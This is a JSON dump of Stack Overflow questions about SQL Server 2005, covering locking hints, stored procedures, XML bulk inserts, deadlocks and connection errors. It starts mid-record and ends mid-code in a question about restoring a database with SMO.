SSMS","body":"<p>I have a huge .sql file (1.5 gb). I generated it from scripting a datasbase in Sql server 2008. Now i want to run the script on another machine to create the same database with all the data, but when i try to open it, SSMS throws an out of memory exception. The machine has 8gb of ddr3 ram, so the computer can handle it. How can i run my file, copy.sql, which has the t-sql code to create my database without opening it? Something like this in a query window in SSMS:</p>\n\n<pre><code>   exec copy.sql\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1432,"score":3,"question_id":6033957,"title":"SQL Server: Select Top 0?","body":"<p>We just came across this in an old production stored proc (there is a lot more going on in here, but this is in one leg of its logic). Why would someone ever select top 0 rows from a table?  Is this some sort of SQL hack or trick I am not familiar with?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":10685530,"title":"Finding the query that is associated to a scheduled job","body":"<p>I am new to sql server, we have sql server 2005 and have scheduled jobs running.\nI want to know the query that is getting invoked when a scheduled job is run.\nI have checked <em>job activity monitor->right click on the job->properties->steps</em></p>\n\n<p>I can see the name and type there, but cannot know what procedure is getting invoked and the code for that.</p>\n"},{"tags":["c#","sql","sql-server","sql-server-2005","ssl"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1699,"score":1,"question_id":3674160,"title":"Using Encrypt=yes in a Sql Server connection string -> \"provider: SSL Provider, error: 0 - The certificate's CN name does not match the passed value.\"","body":"<p>Hi geniuses (is that genii?)</p>\n\n<p>I'm using 'Encrypt=yes' in a Sql Server connection string, because i need the tcpip traffic to be encrypted, but on opening the connection i get the error:</p>\n\n<pre><code>A connection was successfully established with the server, but then an error\noccurred during the pre-login handshake. (provider: SSL Provider, error: 0 -\nThe certificate's CN name does not match the passed value.)\n</code></pre>\n\n<p>Any suggestions how to fix this? I assume i need some sort of certificate relationship between my servers, but have no idea where to start.</p>\n\n<p>I need this for two connections, one each to a sql 2000 server, and one to a 2005 server.</p>\n\n<p>Thanks a lot in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","read-committed-snapshot"],"answer_count":18,"favorite_count":11,"up_vote_count":29,"down_vote_count":0,"view_count":59728,"score":29,"question_id":1483725,"title":"SELECT FOR UPDATE with SQL Server","body":"<p>I'm using a Microsoft SQL Server 2005 database with isolation level <code>READ_COMMITTED</code> and <code>READ_COMMITTED_SNAPSHOT=ON</code>.</p>\n\n<p>Now I want to use:</p>\n\n<pre><code>SELECT * FROM &lt;tablename&gt; FOR UPDATE\n</code></pre>\n\n<p>...so that other database connections block when trying to access the same row \"FOR UPDATE\".</p>\n\n<p>I tried: </p>\n\n<pre><code>SELECT * FROM &lt;tablename&gt; WITH (updlock) WHERE id=1\n</code></pre>\n\n<p>...but this blocks all other connections even for selecting an id other than \"1\".</p>\n\n<p>Which is the correct hint to do a <code>SELECT FOR UPDATE</code> as known for Oracle, DB2, MySql?</p>\n\n<p><strong>EDIT 2009-10-03:</strong></p>\n\n<p>These are the statements to create the table and the index:</p>\n\n<pre><code>CREATE TABLE example ( Id BIGINT NOT NULL, TransactionId BIGINT, \n    Terminal BIGINT, Status SMALLINT );\nALTER TABLE example ADD CONSTRAINT index108 PRIMARY KEY ( Id )\nCREATE INDEX I108_FkTerminal ON example ( Terminal )\nCREATE INDEX I108_Key ON example ( TransactionId )\n</code></pre>\n\n<p>A lot of parallel processes do this <code>SELECT</code>:</p>\n\n<pre><code>SELECT * FROM example o WITH (updlock) WHERE o.TransactionId = ?\n</code></pre>\n\n<p><strong>EDIT 2009-10-05:</strong></p>\n\n<p>For a better overview I've written down all tried solutions in the following table:</p>\n\n<pre>\nmechanism              | SELECT on different row blocks | SELECT on same row blocks\n-----------------------+--------------------------------+--------------------------\nROWLOCK                | no                             | no\nupdlock, rowlock       | yes                            | yes\nxlock,rowlock          | yes                            | yes\nrepeatableread         | no                             | no\nDBCC TRACEON (1211,-1) | yes                            | yes\nrowlock,xlock,holdlock | yes                            | yes\nupdlock,holdlock       | yes                            | yes\nUPDLOCK,READPAST       | no                             | no\n\nI'm looking for        | no                             | yes\n</pre>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":6403,"score":2,"question_id":1525126,"title":"SQL : in clause in storedprocedure:how to pass values","body":"<p>I want to write an SQL Server 2005 stored procedure which will select and return the user records from the user table for some userids which are passed to the stored procedure as parameter. </p>\n\n<p>How to do this ? </p>\n\n<p>I can pass the user ids as a string separated by comma. So that i can use the </p>\n\n<pre><code>select * from users where userid in (userids)\n</code></pre>\n\n<p>Ex : I want to select records for id's 5,6,7,8,9</p>\n\n<p>How to write the stored procedure ?</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":6,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":7764,"score":6,"question_id":7892334,"title":"Get size of all tables in database","body":"<p>I have inherited a fairly large SQL Server database. It seems to take up more space than I would expect, given the data it contains.</p>\n\n<p>Is there an easy way to determine how much space on disk each table is consuming?</p>\n"},{"tags":["c#","asp.net","sql-server-2005","globalization","cjk"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":397,"score":6,"question_id":9844860,"title":"Allowing Simplified Chinese Input","body":"<p>The company I work for is bidding on a project that will require our eCommerce solution to accept simplified Chinese input. After doing a bit of research, it seems that ASP.net makes globalization configuration easy:</p>\n\n<pre><code>&lt;configuration&gt;\n  &lt;system.web&gt;\n    &lt;globalization\n      fileEncoding=\"utf-8\"\n      requestEncoding=\"utf-8\"\n      responseEncoding=\"utf-8\"\n      culture=\"zh-Hans\"\n      uiCulture=\"en-us\" /&gt;\n  &lt;/system.web&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p><strong>Questions:</strong></p>\n\n<ol>\n<li>Is this really all there is to it in ASP.net? It seems to good to be true.</li>\n<li>Are there any DB considerations with SQL Server 2005? Will the DB accept the simplified Chinese without additional configuration?</li>\n</ol>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":10674200,"title":"ExecuteNonQuery is returning Random numbers instead of returning actual rows","body":"<p>I have stored procedure which takes xml as an input .</p>\n\n<p>The C# code to execute the SP is </p>\n\n<pre><code>using (SqlConnection conn = new SqlConnection(connString))\n{\n    try\n    {\n        conn.Open();\n        SqlCommand command = new SqlCommand(\"sp_Configure_Users\", conn);\n        command.CommandType = CommandType.StoredProcedure;\n        var xmlData = new SqlParameter(parameterName: \"@XMLDATA\", value: GenerateXML(_userDetails));\n        command.Parameters.Add(xmlData);\n\n        count = command.ExecuteNonQuery();\n        if (count &gt; 0)\n        {\n            return count;\n        }\n        else\n        {\n            return 0;\n        }\n    }\n    catch (SqlException  )\n    {\n\n    }\n}\n</code></pre>\n\n<p>The method GenerateXML returns a string which is in the form of xml data .In my stored proc i have removed SET NOCOUNT ON to return me the actual no of rows when inserted ,deleted or updated .If i run my query with the sample xml data :-</p>\n\n<pre><code>&lt;UserCollection&gt;\n    &lt;InsertList&gt;&lt;Users User_Id=\"438\"  First_Name=\"Praveen\"  Middle_Name=\"\"  Last_Name=\"Kumar\"  Designation_Id=\"1\"  Email=\"\" Contact_Number=\"96533\"  Updated_By=\"pkumar\"  /&gt;\n    &lt;/InsertList&gt;\n    &lt;UpdateList&gt;&lt;/UpdateList&gt;\n    &lt;DeleteList&gt;&lt;/DeleteList&gt;\n&lt;/UserCollection&gt;\n</code></pre>\n\n<p>The value returned is 3 instead of 1 as in my collection im passing only a single row  which needs to be inserted .Since there are no rows which are updated or deleted .How can the SP return 3 when it has to return only 1 ??</p>\n\n<p>The stored Proc is </p>\n\n<pre><code>  set ANSI_NULLS ON\n  set QUOTED_IDENTIFIER ON\n   go\n\n\n\n  ALTER PROCEDURE [dbo].[sp_Configure_Users]\n@XMLDATA xml\n  AS\n DECLARE @Users_Staging Table(\n[User_Id] [int] NOT NULL,\n[First_Name] [varchar](200) NOT NULL,\n[Middle_Name] [varchar](200) NULL,\n[Last_Name] [varchar](200) NOT NULL,\n[Designation_Id] [int] NOT NULL,\n[Email] [varchar](250) NOT NULL,\n[Contact_Number] [varchar](50) NOT NULL,\n[Updated_By] [varchar](255) NOT NULL\n  )\n\n  BEGIN\n\n  Set nocount off\n  Go    \n\n  BEGIN TRY\n  BEGIN TRANSACTION\n\n\n  DECLARE @CurrDate datetime;\n  SELECT @CurrDate = GETDATE();\n   -- Insert statements for procedure \n  INSERT INTO Users\n  ([User_Id]\n  ,[First_Name]\n  ,[Middle_Name]\n  ,[Last_Name]\n  ,[Designation_Id]\n  ,[Email]\n  ,[Contact_Number]\n  ,[Updated_By]\n  ,[Updated_Date]\n  )\n  Select    \nXMLDATA.item.value('@User_Id[1]', 'int') AS User_Id,    \nXMLDATA.item.value('@First_Name[1]', 'varchar(200)') AS First_Name,\nXMLDATA.item.value('@Middle_Name[1]', 'varchar(200)') AS Middle_Name,\nXMLDATA.item.value('@Last_Name[1]', 'varchar(200)') AS Last_Name,\nXMLDATA.item.value('@Designation_Id[1]', 'int') AS Designation_Id,\nXMLDATA.item.value('@Email[1]', 'varchar(250)') AS Email,\nXMLDATA.item.value('@Contact_Number[1]', 'varchar(50)') AS Contact_Number,\nXMLDATA.item.value('@Updated_By[1]', 'varchar(255)') AS Updated_By,\n@CurrDate\n  FROM @XMLDATA.nodes('//UserCollection/InsertList/Users') AS XMLDATA(item)\n\n  -- Update statements for procedure \n\n  INSERT INTO @Users_Staging\n       ([User_Id]\n  ,[First_Name]\n  ,[Middle_Name]\n  ,[Last_Name]\n  ,[Designation_Id]\n  ,[Email]\n  ,[Contact_Number]\n  ,[Updated_By])\n\nSelect  \nXMLDATA.item.value('@User_Id[1]', 'int') AS User_Id,    \nXMLDATA.item.value('@First_Name[1]', 'varchar(200)') AS First_Name,\nXMLDATA.item.value('@Middle_Name[1]', 'varchar(200)') AS Middle_Name,\nXMLDATA.item.value('@Last_Name[1]', 'varchar(200)') AS Last_Name,\nXMLDATA.item.value('@Designation_Id[1]', 'int') AS Designation_Id,\nXMLDATA.item.value('@Email[1]', 'varchar(250)') AS Email,\n   XMLDATA.item.value('@Contact_Number[1]', 'varchar(50)') AS Contact_Number,\nXMLDATA.item.value('@Updated_By[1]', 'varchar(255)') AS Updated_By\n  FROM @XMLDATA.nodes('//UserCollection/InsertList/Users') AS XMLDATA(item)\n\n\n  UPDATE Users \n  SET First_Name=stgusr.First_Name,\n  Middle_Name=stgusr.Middle_Name,\n  Last_Name=stgusr.Last_Name,\n  Email=stgusr.Email,\n  Contact_Number=stgusr.Contact_Number,\n  Updated_By=stgusr.Updated_By,\n  Updated_Date=@CurrDate\n  FROM Users usr INNER JOIN\n  @Users_Staging stgusr\n  ON usr.User_Id=stgusr.User_Id\n\n-- Delete statements for procedure \n\n   DELETE Users\n   WHERE User_Id\n     IN (Select         \n    XMLDATA.item.value('@User_Id[1]', 'int') AS User_Id\nFROM @XMLDATA.nodes('//UserCollection/DeleteList/Users') AS XMLDATA(item))\n\n   COMMIT TRANSACTION;\n\n   END TRY\n\n   BEGIN CATCH\n--EXEC sp_rethrow_error;\nROLLBACK TRANSACTION;\n    END CATCH; \n   END\n</code></pre>\n"},{"tags":["asp.net","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":181,"score":1,"question_id":10668140,"title":"IsNULL and Coalesce proper usage","body":"<p>As we have two options to intercept the null values coming from database...</p>\n\n<blockquote>\n  <ol>\n  <li>ISNull</li>\n  <li>Coalesce</li>\n  </ol>\n</blockquote>\n\n<p>Following are the ways to write the query for the above two functions...</p>\n\n<p><code>Select IsNull(Columnname, '') As validColumnValue From TableName</code></p>\n\n<p><code>Select Coleasce(Columnname, '') As validColumnValue From TableName</code></p>\n\n<p>Query - Which should be prefered in which situation and why?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":130,"score":1,"question_id":10665413,"title":"SQL - Extracting a set from multiple tables, grouping, then sum","body":"<p>I need to extract data from the tables RawData and RawDataMeter and sum the 'Value' field for each unique MeterId for the last 10 minutes (relative to the TimeStamp). The RawData and  RawDataMeter tables as joined via the RawDataId field using a INNER JOIN, records are only selected when the RawData.BuildingId and RawDataMeter.MeterId exist within the BuildingMeter table. I.e. the query needs select the fields from RawData and RawDataMeter tables only if they exist in the BuildingMeter table, it then needs to get the latest record for each meter (based on the TimeStamp) and then retrieve the last 10 minutes worth of values for that meter. Once it has these values, it needs to SUM each meters 10 minutes worth of values and output the results.</p>\n\n<p>The query I have so far is:</p>\n\n<pre><code>SELECT TOP (SELECT COUNT(DISTINCT BuildingMeterId) FROM BuildingMeter)\n    MeterId, BuildingId, TimeStamp, Value\nFROM\n    RawData\n    INNER JOIN \n        RawDataMeter \n    ON RawData.RawDataId = RawDataMeter.RawDataId\nWHERE\n    EXISTS\n        (SELECT \n            BuildingId,\n            BuildingMeterId\n        FROM\n            BuildingMeter)\nORDER BY\n    TimeStamp DESC\n</code></pre>\n\n<p>Which produces the following results:</p>\n\n<pre><code>1   1   2012-05-16 12:51:00.000 216\n2   1   2012-05-16 12:51:00.000 876989\n3   1   2012-05-16 12:51:00.000 389164\n4   1   2012-05-16 12:51:00.000 1.298896E+07\n5   1   2012-05-16 12:51:00.000 283378\n6   1   2012-05-16 12:51:00.000 1541438\n7   1   2012-05-16 12:51:00.000 4241823\n8   1   2012-05-16 12:51:00.000 5761659\n9   1   2012-05-16 12:51:00.000 3\n10  1   2012-05-16 12:51:00.000 0\n11  1   2012-05-16 12:51:00.000 23\n12  1   2012-05-16 12:51:00.000 3822836\n13  1   2012-05-16 12:51:00.000 4983960\n14  1   2012-05-16 12:51:00.000 909497\n15  1   2012-05-16 12:51:00.000 7724438\n</code></pre>\n\n<p>BuildingMeter table sample (i've only included 1 building with 15 meters (this is variable)):</p>\n\n<pre><code>BuildingId  BuildingMeterId\n1   1\n1   2\n1   3\n1   4\n1   5\n1   6\n1   7\n1   8\n1   9\n1   10\n1   11\n1   12\n1   13\n1   14\n1   15\n</code></pre>\n\n<p>The sample data for the last 30 records from RawData:</p>\n\n<pre><code>RawDataId, TimeStamp, BuildingId\n21677   2012-05-16 00:03:00.000 1\n21678   2012-05-16 00:03:00.000 1\n21679   2012-05-16 00:03:00.000 1\n21680   2012-05-16 00:03:00.000 1\n21681   2012-05-16 00:03:00.000 1\n21682   2012-05-16 00:03:00.000 1\n21683   2012-05-16 00:03:00.000 1\n21684   2012-05-16 00:03:00.000 1\n21685   2012-05-16 00:03:00.000 1\n21686   2012-05-16 00:03:00.000 1\n21687   2012-05-16 00:03:00.000 1\n21688   2012-05-16 00:03:00.000 1\n21689   2012-05-16 00:03:00.000 1\n21690   2012-05-16 00:03:00.000 1\n21691   2012-05-16 00:03:00.000 1\n21662   2012-05-16 00:02:00.000 1\n21663   2012-05-16 00:02:00.000 1\n21664   2012-05-16 00:02:00.000 1\n21665   2012-05-16 00:02:00.000 1\n21666   2012-05-16 00:02:00.000 1\n21667   2012-05-16 00:02:00.000 1\n21668   2012-05-16 00:02:00.000 1\n21669   2012-05-16 00:02:00.000 1\n21670   2012-05-16 00:02:00.000 1\n21671   2012-05-16 00:02:00.000 1\n21672   2012-05-16 00:02:00.000 1\n21673   2012-05-16 00:02:00.000 1\n21674   2012-05-16 00:02:00.000 1\n21675   2012-05-16 00:02:00.000 1\n21676   2012-05-16 00:02:00.000 1\n</code></pre>\n\n<p>Sample for RawDataMeter:</p>\n\n<pre><code>MeterId, RawDataId, Value\n15  21691   7722613\n14  21690   908944\n13  21689   4982947\n12  21688   3821899\n11  21687   6\n10  21686   0\n9   21685   0\n8   21684   5761656\n7   21683   4240048\n6   21682   1541372\n5   21681   283223\n4   21680   1.298603E+07\n3   21679   388137\n2   21678   876121\n1   21677   0\n15  21676   7722615\n14  21675   908944\n13  21674   4982947\n12  21673   3821899\n11  21672   5\n10  21671   0\n9   21670   0\n8   21669   5761656\n7   21668   4240052\n6   21667   1541372\n5   21666   283223\n4   21665   1.298604E+07\n3   21664   388137\n2   21663   876122\n1   21662   0\n</code></pre>\n\n<p>EDIT:</p>\n\n<p>Following the steps outlined by Gordon, I managed to get the following SQL query, which appears to be working correctly:</p>\n\n<pre><code>WITH \n    RawMeterData (MeterId, BuildingId, TimeStamp, LatestTimeStamp, Value) AS\n(SELECT\n    RawDataMeter.MeterId, \n    RawData.BuildingId, \n    RawData.TimeStamp, \n    MAX(RawData.TimeStamp) OVER (PARTITION BY BuildingMeter.BuildingMeterId) AS LatestTimeStamp, \n    RawDataMeter.Value\nFROM\n    BMS_RawData AS RawData\n    INNER JOIN \n        BMS_RawDataMeter AS RawDataMeter \n    ON RawData.RawDataId = RawDataMeter.RawDataId\n    INNER JOIN\n        (SELECT \n            DISTINCT BuildingId,\n            BuildingMeterId\n        FROM\n            AST_BuildingMeter) as BuildingMeter \n        ON RawData.BuildingId = BuildingMeter.BuildingId AND \n        RawDataMeter.MeterId = BuildingMeter.BuildingMeterId)\nSELECT MeterId, BuildingId, SUM(Value) AS Value FROM RawMeterData WHERE RawMeterData.TimeStamp \nBETWEEN DATEADD(mi, -9, LatestTimeStamp) AND LatestTimeStamp\nGROUP BY MeterId, BuildingId\n</code></pre>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":106,"score":5,"question_id":10665817,"title":"Implementing a naming standard for keys, indexes, constraints","body":"<p>I have a database with a lot of tables, and I want to rename the primary/foreign keys, indexes and default constraints according to the following rules :</p>\n\n<ul>\n<li>Primary keys : <code>PK_&lt;table name&gt;</code>  </li>\n<li>Foreign keys : <code>FK_&lt;table_name&gt;_&lt;column name1&gt;_column name2&gt;...</code>  </li>\n<li>Indexes      : <code>IX_&lt;table_name&gt;_&lt;column name1&gt;_column name2&gt;...</code> </li>\n<li>Default Constraints  : <code>DF_&lt;table_name&gt;_&lt;column name&gt;</code></li>\n<li>Check Constraints  : <code>CK_&lt;table_name&gt;_&lt;column name&gt;</code></li>\n</ul>\n\n<p>Someone has already done a similar SQL script ?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":10100449,"title":"How to solve sql server remote exe connection issue?","body":"<p>Sql server is installed in remote machine. When i connect that remote sql sever 2005 through code or run exe from my system, its working fine.Exe's are placed in remote machine and the sql sever also exists in that machine. When i try to open that exe from that remote system, i am getting sql server connection error.</p>\n\n<p>The exe worked in windows xp without any issue, facing this issue only in windows 7.</p>\n\n<p>Read an article in microsoft, it asks to add new rule under windows firefall, inbounds and outbounds. Added TPC, UDP port as mentioned.</p>\n\n<p>Tried the below 2 links. Still i am in trouble.</p>\n\n<p><a href=\"http://www.sevenforums.com/system-security/58817-remote-access-sql-server-express-2008-windows-7-a.html\" rel=\"nofollow\">http://www.sevenforums.com/system-security/58817-remote-access-sql-server-express-2008-windows-7-a.html</a></p>\n\n<p><a href=\"http://msdn.microsoft.com/en-us/library/ms190181.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/ms190181.aspx</a></p>\n\n<p>Can anybody guide me in this regards.</p>\n"},{"tags":["java","sql-server-2005","jdbc","resultset"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":783,"score":-1,"question_id":10659083,"title":"Go to last row from result set in jdbc with sql server","body":"<p>i try to select from my table, only select the last row. I've tried this :</p>\n\n<pre><code>rset = s.executeQuery(\"select noorder from orders\");\nrset.last();\nString noorder = rset.getString(\"noorder\");`\n</code></pre>\n\n<p>rset is resultset, and s is statement. But it throw an exception : ResultSet may only be accessed in a forward direction`</p>\n\n<p>I've tried this to :</p>\n\n<pre><code>if (rset != null) {                \n   while(rset.next()){\n       rset.last();\n   }\n}\n</code></pre>\n\n<p>Am I doing wrong? Any idea? Thanks</p>\n\n<p>Edit :\nThis is the answer, as suggested by @Bhavik-Ambani (thanks for him). And this is my code :</p>\n\n<pre><code>        Statement s2 = con.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);\n        rset = s2.executeQuery(\"select noorder from orders\");\n        rset.afterLast();\n        GETLASTINSERTED:\n        while(rset.previous()){\n            noorder = rset.getString(\"noorder\");\n            break GETLASTINSERTED;//to read only the last row\n        }\n</code></pre>\n\n<p>Hope it will be help another. Java rocks!</p>\n"},{"tags":["query","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":10657330,"title":"SQL Server 2005 Killing Query by time","body":"<p>I have come across with a doubt regarding stopping (killing) a query:</p>\n\n<p>There is a procedure that changes the amount of data that a subscriber replicates (I don't know all the details, it is some functionality that has been already implemented by the company), it's in a transaction, so if it not finished it will rollback, while performing this procedure the replication for all subscribers is blocked, that is why we perform this operation during the night when the amount of subscribers replicating will be less or none. It is the weekend and I want to leave running the procedure (Friday 10pm) but I would like it to rollback if it doesn't finish e.g. at 6am on Saturday and without the need to go to the office in order to stop the procedure manually.</p>\n\n<p>setting it to run at 10pm is easy I have used</p>\n\n<pre><code>waitfor time '22:00'\n</code></pre>\n\n<p>I'm aware that in the same query can't be a script that can stop the whole query since it is \"sequential\", is there a way to do it opening other query tab? I hope that creating a job is not the only solution (if it is a solution at all).</p>\n\n<p>Thank you for your replies.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":10658968,"title":"Can't connect to sql server computer uses guest instead of user account","body":"<p>I'm trying to setup an odbc connection to a sql server. When I do the test I get this message:\n[Microsoft]ODBC SQL Server Driver][SQL Server]Login failed for user 'server\\guest'</p>\n\n<p>I'm not sure why it's trying to conect with the guest account instead of the user I'm logged in as. </p>\n\n<p>We have determined the problem is on the server's end since there are 2 machines that cannot connect to this server. The server is running xp pro sp3</p>\n"},{"tags":["c#","xml","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":127,"score":1,"question_id":10658625,"title":"SQL Server using XML to perform mass updates in single query","body":"<p>I've been using the below sample code snippet to update a SQL Server 2005 database table. It converts a <code>List&lt;T&gt;</code> where <code>T</code> is a custom object with a series of properties (fields) into XML attributes on row elements nested inside a row root element.</p>\n\n<p>In this way, I make a huge series of inserts in one SQL transaction. Following this similar route, I wanted to provide an XML series of <em>updates</em> rather than inserts. I wasn't able to find any good sources on how I might adapt this approach for that. e.g. Say update B thru F based on a primary key A.</p>\n\n<pre><code>conn.Open();\ncmd = new SqlCommand();\ncmd.Connection = conn;\ncmd.CommandText = @\"INSERT table (A,B,C,D,E,F) \nSELECT Tbl.Col.value('@A','nvarchar(50)'),\n       Tbl.Col.value('@B','int'),\n       Tbl.Col.value('@C','nvarchar(50)'),\n       Tbl.Col.value('@D','nvarchar(1000)'),\n       Tbl.Col.value('@E','nvarchar(50)'),\n       Tbl.Col.value('@F','nvarchar(50)')\nFROM @xml.nodes('//row') Tbl(Col)\";\ncmd.Parameters.Add(\"@xml\", SqlDbType.Xml).Value = new XDocument(\nnew XDeclaration(\"1.0\", \"utf-8\", \"yes\"),\nnew XElement(\"rows\",\ntoInsert.Select(p =&gt; new XElement(\"row\", new XAttribute(\"A\", x.Prop1),\n                     new XAttribute(\"B\", x.Prop2),\n                     new XAttribute(\"C\", x.Prop3),\n                     new XAttribute(\"D\", x.Prop4),\n                     new XAttribute(\"E\", x.Prop5),\n                     new XAttribute(\"F\", x.Prop6))))).ToString();\nConsole.WriteLine(cmd.ExecuteNonQuery().ToString() + \" row(s) affected.\");\nconn.Close();\n</code></pre>\n"},{"tags":["visual-studio-2010","sql-server-2005","ssis"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":829,"score":2,"question_id":10654311,"title":"SSIS - SQL Server 2005 and Visual Studio 2010","body":"<p>I am new to SSIS and have worked earlier on DTS. Currently, I have a ASPX project that uses crystal reports to render some reports.</p>\n\n<p>I am modeling data coming in various data sources into one sql server. As part of that, I have a complex excel file that needs to be mapped into SQL Server.</p>\n\n<p>I am planning to Use SSIS. Now, I believe there is no SSIS project for VS2010.</p>\n\n<p>Could somebody help me to get started? What environment do I need to set up for this? Where can I find the plug-in for visual studio?</p>\n\n<p>I appreciate your support.</p>\n"},{"tags":["sql-server-2005","deadlock"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1142,"score":3,"question_id":1437200,"title":"SqlServer 2005: deadlock problem with no shared records","body":"<p>I have a deadlock problem with two transactions that do not access any common records. There is also no lock escalation. So I can't explain why a deadlock is possible.</p>\n\n<p>The deadlock occurs when two such transactions are executed at the same time:</p>\n\n<pre><code>begin transaction\n\nupdate A set [value] = [value]\nwhere id = 1; /* resp. 2 */\n\n/* synchronize transactions here */\n\nSELECT * \nFROM  \n A inner join B on A.B_FK = B.id\n inner join C on C.A_FK = A.id\nWHERE \n A.[value] = 1; /* resp. 2 */\n\nrollback;\n</code></pre>\n\n<p>These are the tables and data to setup the scenario:</p>\n\n<pre><code>CREATE TABLE A (\n  id INT NOT NULL,\n  [value] INT,\n  B_FK INT\n  primary key (id)\n)\n\nCREATE TABLE B (\n  id INT NOT NULL,\n  primary key (id)\n)\n\nCREATE TABLE C (\n  id INT NOT NULL,\n  A_FK INT\n  primary key (id)\n)\n\nINSERT INTO A VALUES(1, 1, 1) \nINSERT INTO B VALUES(1) \nINSERT INTO C VALUES(1, 1) \n\nINSERT INTO A VALUES(2, 2, 2) \nINSERT INTO B VALUES(2) \nINSERT INTO C VALUES(2, 2)\n</code></pre>\n\n<p>Table <code>A</code> is in the middle of three tables. If I change anything in the query, for instance remove one of the joined tables <code>B</code> or <code>C</code>, there is no deadlock. The same when I filter by <code>A.id</code> instead of <code>A.value</code>.</p>\n\n<p>The deadlock-graph tells me that they both want to set an S lock to the primary key index of table <code>A</code>. Again: there is no lock escalation.</p>\n\n<p>I'm using SqlServer 2005.</p>\n\n<ul>\n<li>Why are these transactions conflicting without accessing any common data? Can anyone explain this?</li>\n<li>What can I do to avoid it? I'm using NHibernate and can not change the query that easily.</li>\n<li>Could it be an SqlServer issue?</li>\n</ul>\n\n<p>Thanks a lot.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":10654575,"title":"SQL date insert","body":"<p>I have run a query to get certain results that i am happy with but I now wnat to insert a piece of code which will force a user to manually input a date range for the results.</p>\n\n<p>My code so far is .....</p>\n\n<pre><code>SELECT     vwREP_GP_ContractProjectPurchaseCostCatID.PACOSTCATID AS COST_CAT_CODE, \n           vwREP_GP_ContractProjectPurchaseCostCatID.PACOSTCATNME AS COST_CAT_NAME, \n           vwREP_GP_ContractProjectPurchaseRpt.COST, \n           vwREP_GP_ContractProjectPurchaseRpt.ITEMDESC AS ITEM, \n           vwREP_GP_ContractProjectPurchaseRpt.CREDITOR, \n           vwREP_GP_ContractProjectPurchaseRpt.DOC_NUM AS DOCUMENT_NUMBER, \n           vwREP_GP_ContractProjectPurchaseRpt.DESCRIPTION, \n           vwREP_GP_ContractProjectPurchaseRpt.DOC_DATE AS DATE,  \n           vwREP_GP_ContractProjectPurchaseRpt.PROJECT AS JOB_CODE_STAGE, \n           vwREP_GP_ContractProjectPurchaseRpt.COMPOUNDNAME AS CATEGORY_DESCRIPTION\n\n\nFROM         vwREP_GP_ContractProjectPurchaseCostCatID INNER JOIN\n                      vwREP_GP_ContractProjectPurchaseRpt ON vwREP_GP_ContractProjectPurchaseCostCatID.PACOSTCATID = vwREP_GP_ContractProjectPurchaseRpt.PACOSTCATID\n\n\nSELECT  CATEGORY_DESCRIPTION, CAST(SUM(COST) AS DECIMAL(12, 2)) AS TOTAL_COST \n\nFROM    (   \n        SELECT COMPOUNDNAME AS CATEGORY_DESCRIPTION, COST  \n        FROM   vwREP_GP_ContractProjectPurchaseRpt  \n        ) A \nGROUP BY  \n        CATEGORY_DESCRIPTION\n</code></pre>\n\n<p>and I was thinking along the lines of inserting a string of code like ....  </p>\n\n<pre><code>SELECT * FROM vwREP_GP_ContractProjectPurchaseRpt\nWHERE (DOC_DATE &gt;= @DateFrom) \nAND (DOC_DATE  &lt;= @DateTo)\n</code></pre>\n\n<p>But I am getting stuck on how to get this to work.</p>\n\n<p>Any suggestions would be much appreciated.</p>\n\n<p>All work is being done on SQL Server Management Studio 2005 and will be deployed on MS Visual Studio eventually.</p>\n\n<p>SORRY I missed this off when pasting my code.  I declared my varibles like this ...</p>\n\n<pre><code>DECLARE @DateFrom datetime \nDECLARE @DateTo datetime\n</code></pre>\n\n<p>then the following.....</p>\n\n<pre><code>SELECT * FROM vwREP_GP_ContractProjectPurchaseRpt \nWHERE (DOC_DATE &gt;= @DateFrom)  \nAND (DOC_DATE  &lt;= @DateTo)\n</code></pre>\n\n<p>All it did was return a blank results pane?</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":879,"score":2,"question_id":3861981,"title":"how to restore using restore class of Microsoft.SqlServer.Management.Smo namespace","body":"<pre><code>public void  RestoreDatabase(String databaseName, String filePath, \n            String serverName, String userName, String password, String dataFilePath, String logFilePath)\n{\n    Restore sqlRestore = new 